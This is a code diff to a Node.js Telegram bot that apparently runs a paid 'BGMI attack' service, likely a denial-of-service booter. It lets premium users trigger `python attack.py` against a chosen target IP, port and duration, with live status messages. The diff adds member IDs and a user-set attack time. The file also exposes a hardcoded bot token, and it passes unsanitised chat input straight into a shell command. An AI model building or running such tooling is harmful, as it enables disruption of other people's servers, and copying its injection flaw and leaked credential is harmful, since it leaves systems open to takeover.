@@ -3,14 +3,14 @@ const fs = require("fs");
 const fetch = require("node-fetch");
 const { exec } = require('child_process');
 const token = "7361699788:AAHN6u7I40WbRuxDsyMcJd7BcvXDJoUvM88";
-admin_account = [701327388];
+admin_account = [701327388, -1002196164125];
 USER_FILE = "users.txt";
 LOG_FILE = "log.txt";
 // Create a new bot instance
 const bot = new TelegramBot(token, { polling: true });
 let message;
 publicMembers = [701327388];
-premiumMembers = [];
+premiumMembers = [1109637338, 5437953839, 1059400908];
 const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
 function touchRestartFile() {
@@ -133,7 +133,43 @@ You're Not Authorized To Use This Command`
     console.error("Error:", err);
   }
 });
-bot.onText(/^\/bgmi_private($|\s)/, async (msg) => {
+
+async function sendSpinnerMessage(bot, chatId, initialMessageId, totalTime, name, command, target, port) {
+  const spinnerChars = ['⏳', '⌛', '⏰', '⏱️'];
+  let currentSpinnerIndex = 0;
+  let remainingTime = totalTime;
+
+  const spinnerInterval = setInterval(async () => {
+    currentSpinnerIndex = (currentSpinnerIndex + 1) % spinnerChars.length;
+    remainingTime -= 1;
+
+    if (remainingTime <= 0) {
+      clearInterval(spinnerInterval);
+      return;
+    }
+
+    try {
+      await bot.editMessageText(
+        `Dear ${name
+        },\n<b>Attack Started..${spinnerChars[currentSpinnerIndex]}!</b>\n<b>Attack Type:</b> ${command === "/bgmi_private"
+          ? "Premium Method"
+          : "Slow Method (Sometimes does not work)"
+        }\n<b>Target:</b> ${target},\n<b>Port:</b> ${port}\n<b>Time:</b> ${remainingTime} Seconds Left`,
+        {
+          parse_mode: "HTML",
+          chat_id: chatId,
+          message_id: initialMessageId,
+        }
+      );
+    } catch (err) {
+      console.error('Error updating spinner message:', err);
+    }
+  }, 1000); // Update every second
+
+  return spinnerInterval;
+}
+
+bot.onText(/^\/bgmi_private($|\s)/, async (msg, match) => {
   const chatId = msg.chat.id;
   try {
     if (!premiumMembers.includes(chatId) && !admin_account.includes(chatId)) {
@@ -145,25 +181,27 @@ bot.onText(/^\/bgmi_private($|\s)/, async (msg) => {
         reply_to_message_id: msg.message_id,
       });
     } else {
-      const [command, target, port] = msg.text.split(" ");
+      const [command, target, port, time] = msg.text.split(" ");
       if (target && port) {
-        const message = `Dear ${
-          msg.chat.first_name
-        },\n<b>Attack In Process...!</b>\n<b>Attack Type:</b> ${
-          command === "/bgmi_private"
+        const message = `Dear ${msg.chat.first_name
+          },\n<b>Starting Attack..⏳!</b>\n<b>Attack Type:</b> ${command === "/bgmi_private"
             ? "Premium Method"
             : "Slow Method (Sometimes does not work)"
-        }\n<b>Target:</b> ${target},\n<b>Port:</b> ${port}\n<b>Time:</b> 240 Seconds`;
-        await bot.sendMessage(chatId, message, {
+          }\n<b>Target:</b> ${target},\n<b>Port:</b> ${port}\n<b>Time:</b> ${time} Seconds Left`;
+
+        let initialMessage = await bot.sendMessage(chatId, message, {
           parse_mode: "HTML",
           reply_to_message_id: msg.message_id,
         });
-        exec(`python attack.py ${target} ${port} ${240}`, (error, stdout, stderr) => {
+        let name = msg.chat.first_name;
+        const spinnerInterval = await sendSpinnerMessage(bot, chatId, initialMessage.message_id, time, name, command, target, port);
+        exec(`python attack.py ${target} ${port} ${time}`, async (error, stdout, stderr) => {
+          clearInterval(spinnerInterval);
           if (error) {
             console.error(`Error executing Python script: ${error.message}`);
             return bot.sendMessage(chatId, 'There was an error processing your request.');
           }
-    
+
           if (stderr) {
             console.error(`Error in Python script: ${stderr}`);
             return bot.sendMessage(chatId, 'There was an error processing your request.');
@@ -171,10 +209,10 @@ bot.onText(/^\/bgmi_private($|\s)/, async (msg) => {
           if (!stdout || /^\s*$/.test(stdout)) {
             return bot.sendMessage(chatId, 'The output is empty.');
           }
-          // Paginate the output
-          const chunks = chunkString(stdout, 4000); // Split into chunks of 4000 characters
-          chunks.forEach((chunk, index) => {
-            bot.sendMessage(chatId, chunk);
+          await bot.editMessageText(`Dear ${msg.chat.first_name},\n<b>BGMI Attack Finished✅</b>.\n<b>Target:</b> ${target}.\n<b>Port:</b> ${port}.\n<b>Time:</b> ${time}.\n<b>Attack Status:</b>${'Success'}`, {
+            chat_id: chatId,
+            message_id: initialMessage.message_id,
+            parse_mode: "HTML",
           });
         });
 
